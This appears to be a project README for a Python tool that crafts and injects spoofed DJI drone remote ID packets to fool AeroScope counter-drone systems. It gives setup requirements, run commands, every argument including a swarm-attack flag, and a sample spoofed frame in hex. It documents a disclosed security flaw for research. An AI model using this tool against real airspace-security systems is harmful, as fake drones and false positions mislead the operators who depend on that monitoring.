# DJI Drone Spoof Attack
A Python command-line tool to spoof DJI drones, tricking c-UAV systems like AeroScope (as of May 2022)

## Background
[DJI AeroScope](https://www.dji.com/aeroscope) systems do not verify the validity of drone remote ID packets, making them susceptible to over-the-air spoofing attacks. An attacker equipped with a network adapter in monitor mode can craft and inject spoofed drone remote ID packets, fooling the AeroScope system into detecting fake drones.

These over-the-air spoofing attacks cannot be mitigated because they exploit an inherent design flaw in DJI’s remote identification technology—**the lack of identity verification**.

## Tool Overview
This Python script enables attackers to create spoofed DJI drone remote ID packets, including:

* **Model:** customize fake drone models
* **Packet Type:** choose between different remote ID packet types
* **Altitude & Height:** specify values to simulate drone movements
* **GPS Coordinates:** spoof drone and ground station locations
* **Swarm Attack:** simulate a coordinated swarm of drones (`--swarm`)

The spoofed packets are saved in a packet capture `.pcap` file, allowing for analysis or replay attacks. 

The tool supports the generation of various packet types, including[^1]:

* Generic License Plate (serial number only)
* Enhanced Wi-Fi packets
* OcuSync packets

## Disclaimer
This tool is intended for educational purposes only. Do not use it for illegal activities, and always respect local regulations regarding drone usage and airspace security.

## Requirements
To run this tool, you'll need:

* Python dependencies: `scapy`, `binascii`, etc.
* Network adapter: capable of being set to monitor mode on channel 6 via `airmon-ng` package

## Usage

### Basic Command
`sudo python3 dji_spoof.py`

If no drone specified, the script will default to Inspire 1 with legitimate random serial numbers. 

### Help Menu
`sudo python3 dji_spoof.py -h`

This displays all possible command-line arguments:

```
A DJI Remote ID spoofer for UAVs.

optional arguments:
  -h, --help            show this help message and exit
  -m MODEL, --model MODEL
                        Specify the DJI model number to spoof (Inspire 1 is default).
                        A legitimate random serial number will be generated per model.

  -i INTERFACE, --interface INTERFACE
                        the network interface to launch attacks
  --packet PACKET       Input the packet type:

                            0: Generic License Plate (serial number only, not model)
                            2: Enhanced Wi-Fi
                            3: OcuSync (SDR)

  --altitude ALTITUDE   Input the altitude of the drone
  --height HEIGHT       Input the height of the drone
  --DRONE_LON DRONE_LON
                        Input the longitude of the drone
  --DRONE_LAT DRONE_LAT
                        Input the latitude of the drone
  --CONTROLLER_LON CONTROLLER_LON
                        Input the longitude of the controller
  --CONTROLLER_LAT CONTROLLER_LAT
                        Input the latitude of the controller
  --swarm               Flag to enable a swarm drone attack on the AeroScope
  --pcap PCAP           Save the attack as a .pcap file
```

### Spoofed Inspire 1 Example
```
[+] MODEL: Inspire 1
[+] SERIAL NO.: W215AAOZCSAFUJ34
[+] DRONE HEIGHT: 22.4
[+] DRONE LONGITUDE: -110.012052
[+] DRONE LATITUDE: 35.294722
[+] CONTROLLER LONGITUDE: -95.957371
[+] CONTROLLER LATITUDE: 35.284722
[+] PACKET TYPE: Enhanced Wi-Fi (2)

====================== Frame =========================
0000  00 00 08 00 00 00 00 00 80 00 00 00 FF FF FF FF  ................
0010  FF FF 01 02 03 04 05 06 01 02 03 04 05 06 00 00  ................
0020  00 08 36 52 53 47 4E 4A 57 35 01 04 01 05 07 09  ..6RSGNJW5......
0030  03 01 0B DD 52 26 37 12 58 62 13 10 01 41 00 DF  ....R&7.Xb...A..
0040  0F 57 32 31 35 41 41 4F 5A 43 53 41 46 55 4A 33  .W215AAOZCSAFUJ3
0050  34 2B 05 DB FE DB FE 5D 00 81 00 E0 00 43 00 B8  4+.....].....C..
0060  00 3E 00 D9 00 75 00 17 00 38 73 00 FF 09 F8 5D  .>...u...8s....]
0070  00 01 12 35 37 36 39 36 33 39 33 39 32 34 32 39  ...5769639392429
0080  39 31 31 31 31 00 00                             91111..

[*] Press enter to launch attack...
```

## Licensing
This project is licensed under the terms of the MIT license.

[^1]: https://www.researchgate.net/profile/Margaret-Smith-18/publication/372509234_The_Irregulars_Third-Party_Cyber_Actors_and_Digital_Resistance_Movements_in_the_Ukraine_Conflict/links/660bddad10ca867987365aff/The-Irregulars-Third-Party-Cyber-Actors-and-Digital-Resistance-Movements-in-the-Ukraine-Conflict.pdf#page=295
